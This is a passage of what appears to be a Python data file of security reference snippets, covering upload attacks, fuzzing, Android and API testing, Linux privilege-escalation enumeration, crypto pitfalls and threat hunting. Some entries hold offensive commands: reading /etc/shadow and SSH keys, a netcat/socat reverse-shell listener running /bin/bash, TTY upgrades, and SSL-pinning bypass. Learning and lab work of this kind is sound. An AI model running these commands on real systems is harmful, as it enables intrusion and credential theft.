  - Strict allowlist of allowed classes (Java: ObjectInputFilter, Py: custom Unpickler.find_class)
  - Run inside a sandbox (gVisor, nsjail, isolated container)
  - Sign-then-encrypt the blob; verify signature before any deserialization

Hunt: grep -r 'pickle.loads\\|unserialize(\\|yaml.load(' --include='*.py' --include='*.php' --include='*.java'""",
},
{
    "request": "common file upload pitfalls and defenses",
    "language": "text", "framework": "appsec",
    "code": """ATTACKS:
  - Upload .php/.jsp/.aspx → execute as code
  - Polyglot (image with embedded PHP) — bypasses content-type check
  - Path traversal in filename (../../etc/passwd)
  - Zip bomb / decompression DoS
  - Embedded SVG <script> → stored XSS
  - SSRF via URL fetcher with user-supplied URL (image proxy)
  - Anti-virus evasion → store malware, then download endpoint serves to victims

DEFENSES (apply ALL):
  1. Allowlist by content (magic bytes), not extension or Content-Type header
     python-magic, file(1), libmagic
  2. Re-encode the file:
     - images → re-render through Pillow / ImageMagick to a known format
     - PDFs → ghostscript flatten
  3. Store outside webroot, serve via app handler with Content-Disposition: attachment
  4. Rename on disk to random ID; preserve original name only as metadata
  5. Restrict size: web server level + app level (don't read full body into memory)
  6. Restrict types per use-case (avatar = jpg/png/webp only; not pdf)
  7. AV scan (ClamAV) async before making available
  8. Serve via separate sandbox domain (cookieless) to neutralize HTML uploads:
     user-content.example.com vs app.example.com
  9. Set Content-Security-Policy: sandbox; on the upload-serving response
 10. Strip EXIF/metadata (privacy) — exiftool -all=
 11. For zip-uploads: cap entries count + uncompressed size before extracting""",
},

# ───────── Fuzzing ─────────
{
    "request": "fuzzing with AFL++ / libFuzzer for finding bugs",
    "language": "bash", "framework": "vuln-research",
    "code": """# libFuzzer (in-process, requires LLVM + libfuzzer-friendly target)
# fuzz_target.c
#   int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
#       parse(data, size);  // your code under test
#       return 0;
#   }
clang -g -O1 -fsanitize=fuzzer,address fuzz_target.c parser.c -o fuzz
./fuzz corpus/ -max_total_time=600

# AFL++ (out-of-process, instrumented binary)
afl-clang-lto -g -O1 -fsanitize=address target.c -o target.afl
mkdir in out
echo "seed" > in/s
afl-fuzz -i in -o out -- ./target.afl @@

# Coverage-guided + sanitizers find:
#   ASan   — heap/stack overflows, UAF, double-free
#   UBSan  — int overflow, null deref, OOB shifts
#   MSan   — uninit reads
#   TSan   — data races

# Structure-aware
#   libprotobuf-mutator (proto inputs)
#   FuzzGen for grammars
#   atheris (Python via libFuzzer)
#   cargo-fuzz (Rust)
#   go-fuzz / built-in go test fuzzing

# Triage crashes
afl-tmin -i out/crashes/id:000000... -o min -- ./target.afl @@
afl-cmin                                                # corpus minimizer
gdb ./target.afl -ex 'r < min'""",
},

# ───────── Mobile / API ─────────
{
    "request": "mobile app pentest essentials (Android)",
    "language": "bash", "framework": "mobile-sec",
    "code": """# Setup
adb devices
# Pull APK
adb shell pm path com.example.app
adb pull /data/app/.../base.apk

# Static analysis
apktool d base.apk -o app_src
jadx-gui base.apk                # decompile to Java
mobsf                            # docker run -p 8000:8000 mobsf/mobsf

# Look for:
#   AndroidManifest.xml — exported activities/services/providers, permissions
#   res/xml/network_security_config.xml — cleartextTrafficPermitted? user-CA trusted?
#   smali/ or sources/ — hardcoded keys, URLs, debug flags
#   assets/ — embedded files

# Dynamic / runtime
# Frida (instrumentation)
frida-ps -U
frida -U -l hook.js -f com.example.app

# objection (frida-based, easier UX)
objection -g com.example.app explore
# > android sslpinning disable
# > android root disable
# > android hooking list classes

# Proxy traffic
# 1. Install Burp CA as system-trusted (rooted) or use frida-script for SSL bypass
# 2. Set device proxy to your laptop:8080
# 3. Browse — Burp logs HTTPS

# OWASP MASVS / MASTG = the standards.""",
},
{
    "request": "API security testing checklist (OWASP API Top 10 — 2023)",
    "language": "text", "framework": "appsec",
    "code": """API1  Broken Object Level Authz (BOLA / IDOR)  → test every {id} param across users
API2  Broken Authentication                          → JWT secret, exp, alg=none, refresh handling
API3  Broken Object Property Level Authz             → mass assignment (extra fields in PUT/PATCH)
API4  Unrestricted Resource Consumption              → no rate limit, no pagination cap, expensive queries
API5  Broken Function Level Authz                    → /admin/* reachable as user; method override
API6  Unrestricted Access to Sensitive Business Flow → no friction on bulk ops (gift cards, signups)
API7  SSRF                                            → URL params fetched server-side
API8  Security Misconfiguration                      → debug on, default creds, verbose errors, CORS *
API9  Improper Inventory Management                  → old / shadow APIs, /v1 still up after /v3
API10 Unsafe Consumption of APIs                     → trust 3rd-party API responses without validation

Tooling:
  - OpenAPI spec → drive coverage (Schemathesis fuzzes from spec)
  - Postman / Insomnia for manual flows
  - Authorize / AutoRepeater (Burp) — replay each request as low-priv user
  - kiterunner — content-aware web bruteforce against APIs
  - APISecurity.io newsletter — weekly real-world API breaches""",
},

# ───────── Linux privilege escalation (lab) ─────────
{
    "request": "Linux privilege escalation enumeration (CTF / lab)",
    "language": "bash", "framework": "ctf",
    "code": """# Run on an authorized lab box / CTF VM
# (Don't run these to escalate on systems you don't own.)

# Quick tools
./linpeas.sh -a | tee linpeas.txt        # github.com/peass-ng/PEASS-ng
./LinEnum.sh
./lse.sh -l 2

# Manual highlights
id; hostnamectl; uname -a; cat /etc/os-release
sudo -l                                  # NOPASSWD entries → gtfobins.github.io
find / -perm -4000 2>/dev/null           # SUID
find / -perm -2000 2>/dev/null           # SGID
getcap -r / 2>/dev/null                  # file capabilities
ls -la /etc/cron.* /var/spool/cron 2>/dev/null
systemctl list-timers --all
ps -ef | grep root                       # processes as root we might leverage
mount | grep -v 'noexec\\|nosuid'         # writable + execable mounts
cat /etc/crontab; ls -la /etc/cron.d
cat /etc/passwd; cat /etc/shadow 2>/dev/null
ls -la /home/*/.ssh/ 2>/dev/null

# Kernel exploits — match `uname -r` on exploit-db.com (carefully — can panic the VM)

# References
# - gtfobins.github.io — abuse legitimate binaries with SUID/sudo
# - hacktricks.xyz — Linux privesc playbooks
# - g0tmi1k OSCP-prep linux privilege escalation""",
},

# ───────── Defender resources ─────────
{
    "request": "free defensive resources to follow / use",
    "language": "text", "framework": "blue-team",
    "code": """FRAMEWORKS / STANDARDS
  NIST CSF 2.0, NIST 800-53, ISO 27001/2, CIS Controls v8, MITRE ATT&CK, MITRE D3FEND

DETECTION RULESETS (open)
  Sigma            github.com/SigmaHQ/sigma
  Elastic detect   github.com/elastic/detection-rules
  Splunk SS        github.com/splunk/security_content
  Falco            github.com/falcosecurity/falco
  Wazuh rules      github.com/wazuh/wazuh-ruleset
  YARA-Rules       github.com/Yara-Rules/rules
  Atomic Red Team  github.com/redcanaryco/atomic-red-team

THREAT INTEL (free tiers)
  AlienVault OTX, MISP, abuse.ch (URLhaus, MalwareBazaar, ThreatFox), CIRCL, AbuseIPDB

NEWSLETTERS / FEEDS
  tl;dr sec, Risky Biz, SANS NewsBites, CISA KEV catalog, Krebs on Security

PRACTICE / LABS
  letsdefend.io (SOC), tryhackme.com (defensive paths), blueteamlabs.online,
  splunk attack range, detection-as-code labs

CERTS (defender side)
  GIAC GCFA, GCIH, GCDA, GMON
  BTL1 / BTL2
  CompTIA CySA+, Security+
  AWS Security Specialty / Azure SC-200""",
},

# ───────── Privacy / data handling ─────────
{
    "request": "GDPR / CCPA — engineer's quick reference",
    "language": "text", "framework": "privacy",
    "code": """DATA SUBJECT RIGHTS — your app must support:
  Access      — export all data we have on this user
  Rectify     — let them correct it
  Erase       — \"right to be forgotten\" — purge from prod + backups (or pseudonymize)
  Portability — machine-readable export (JSON / CSV)
  Object      — opt out of processing, esp. marketing
  Restrict    — pause processing pending dispute

ENGINEERING CHECKLIST
  ☐ Inventory: what PII you store, where, why, retention period (data map)
  ☐ Lawful basis tagged per processing activity (consent, contract, legit interest, legal)
  ☐ Consent UI: granular, withdrawable, no pre-ticked boxes
  ☐ Encryption at rest (per record key for sensitive PII; KMS-backed)
  ☐ Encryption in transit (TLS 1.2+, mTLS for internal)
  ☐ Access logs on PII reads (who, when, why) — retain audit log
  ☐ Pseudonymize / tokenize wherever possible (don't propagate raw PII downstream)
  ☐ Vendor / sub-processor list maintained (DPA in place per vendor)
  ☐ DPIA for high-risk processing (AI, large-scale, special categories)
  ☐ Breach notification: 72h to DPA under GDPR
  ☐ Data residency: EU data → EU region

DELETION pitfalls:
  - Cascade across services (event sourcing → tombstone events)
  - Backups → policy: retention period for backup itself, then auto-purge
  - Logs: avoid PII in logs in the first place (don't log emails / IPs unhashed)""",
},

# ───────── Misc cryptography pitfalls ─────────
{
    "request": "common crypto mistakes to avoid",
    "language": "text", "framework": "crypto",
    "code": """1. Reusing nonces with AES-GCM / ChaCha20 — catastrophic (key recovery).
   Always: random 96-bit nonce, OR a counter you guarantee unique per key.

2. Using ECB mode — same plaintext block → same ciphertext. (\"penguin\" image meme.)

3. Padding-oracle — using AES-CBC + HMAC verify after decrypt, leak via timing/error.
   Solution: AEAD (GCM, ChaCha20-Poly1305). Or encrypt-then-MAC with constant-time verify.

4. MAC after compress — leaks via length (CRIME / BREACH on TLS).
   Don't compress secrets together with attacker-controlled data.

5. Comparing HMACs / passwords with == — timing leak.
   Use hmac.compare_digest, crypto.timingSafeEqual, etc.

6. Reusing keys across purposes — one for encryption AND signing, etc.
   Derive purpose-specific subkeys with HKDF.

7. RSA without OAEP / PSS — textbook RSA is broken.

8. Storing IV/nonce as zero / fixed.

9. Math.random() for tokens — predictable.
   Use crypto.randomBytes, secrets.token_urlsafe, os.urandom.

10. Rolling your own crypto — \"don't roll your own\" applies to protocols too.
    Use libsodium / Tink / ring / cryptography. Audit if you must build something.

11. Putting secrets in URLs / logs / referer / bug reports.

12. Long-lived static keys with no rotation plan.""",
},

# ───────── Threat hunting ─────────
{
    "request": "threat hunting hypotheses to start with",
    "language": "text", "framework": "blue-team",
    "code": """Pick a hypothesis, build a query, validate, refine into a detection.

H1: \"An attacker with workstation access establishes C2 over a less-monitored protocol\"
    → DNS TXT record sizes anomalously high (DNS tunneling)
    → outbound on 443 to newly-registered domains (passive DNS age)
    → ICMP with unusual payload sizes

H2: \"Lateral movement using built-in tools (LOLBAS)\"
    → wmic /node:, sc \\\\<host>, schtasks /s, PsExec, WinRM (Invoke-Command)
    → 4624 logon type 3 (network) chains across hosts within minutes

H3: \"Credential dumping on a workstation\"
    → access to lsass.exe by non-AV process
    → Mimikatz patterns (sekurlsa, lsa::pth) in PowerShell
    → registry SAM/SECURITY hive read by user-mode process

H4: \"Persistence in places nobody checks\"
    → WMI subscription consumers, ASEPs, scheduled tasks created with weird Author
    → Image File Execution Options Debugger, AppInit_DLLs
    → systemd .timer or .service in /home or /tmp

H5: \"Cloud key abuse\"
    → IAM action from new IP/UA/region
    → Console login without MFA
    → API call to disable CloudTrail / GuardDuty
    → MakeBucketPublic, KMS ScheduleKeyDeletion, root account use

Library: github.com/Cyb3rWard0g/ThreatHunter-Playbook""",
},

# ───────── Misc tooling ─────────
{
    "request": "useful one-liners for security work",
    "language": "bash", "framework": "security",
    "code": """# Decode base64 with newlines
echo "SGVsbG8=" | base64 -d

# URL encode/decode
python3 -c 'import urllib.parse; print(urllib.parse.quote(input()))'
python3 -c 'import urllib.parse; print(urllib.parse.unquote(input()))'

# Hex dump
xxd -c 16 file.bin | head
xxd -r -p hex.txt > out.bin

# Generate random secret (32 bytes b64)
openssl rand -base64 32
python3 -c 'import secrets; print(secrets.token_urlsafe(32))'

# JWT decode (no verify) — DEBUG only
echo "$JWT" | cut -d. -f2 | base64 -d | jq

# Compute SHA256 / MD5
sha256sum file
echo -n "string" | sha256sum

# HTTP fetch with full headers
curl -sSv --resolve target.test:443:1.2.3.4 https://target.test/ 2>&1 | less

# Diff two API responses
diff <(curl -s url1 | jq -S .) <(curl -s url2 | jq -S .)

# Find world-writable files
find / -xdev -type f -perm -0002 2>/dev/null

# Quick HTTP server to receive callbacks (lab)
python3 -m http.server 8000
# or:  ngrok http 8000   /  cloudflared tunnel --url http://localhost:8000

# Listener for reverse shell (lab)
nc -lvnp 4444
# better: socat -d -d TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# Spawn full TTY after netcat catch (target side)
python3 -c 'import pty; pty.spawn("/bin/bash")'
# then: Ctrl-Z, stty raw -echo; fg, then  export TERM=xterm; stty rows 50 cols 200""",
},

# ───────── Reading list / paths ─────────
{
    "request": "books and resources to actually become elite at security",
    "language": "text", "framework": "career",
    "code": """FOUNDATIONS
  - The Web Application Hacker's Handbook (Stuttard, Pinto)
  - Tangled Web (Zalewski) — browser security model
  - Real-World Cryptography (Wong)
  - Serious Cryptography (Aumasson)
  - The Art of Software Security Assessment (Dowd, McDonald, Schuh)
  - Practical Malware Analysis (Sikorski, Honig)
  - Operating Systems: Three Easy Pieces (free, ostep.org)
  - Computer Networking: A Top-Down Approach (Kurose)

PRACTICE (do, don't just read)
  - PortSwigger Web Security Academy (free, world-class for web)
  - HackTheBox + writeups   (use writeups AFTER attempting)
  - OverTheWire bandit, narnia, leviathan (basics → bin exploit)
  - PicoCTF archives
  - Cryptohack
  - root-me.org

CERTS (only if employer pays / role demands)
  Offense: OSCP → OSEP → OSED → OSEE
  Defense: GCFA, GCIH, GREM, GMON, BTL2
  Cloud:   AWS Security Specialty, GCP Pro Cloud Security, AZ-500

WATCH / READ
  LiveOverflow, IppSec, John Hammond (YouTube)
  PortSwigger research, Project Zero, Watchtowr Labs (blogs)
  Risky Biz podcast, Security Now (overview)
  Phrack (classic), tl;dr sec newsletter

BUILD
  - Run a home SOC: pfsense + Suricata + Elastic SIEM
  - Run a vulnerable lab: DetectionLab, Game of Active Directory (GOAD)
  - Contribute to open source: detection rules, scanners, OSS tools

The only path to \"elite\" is consistent reps — solve a CTF / read a CVE writeup / ship a detection every week for years.""",
},

]
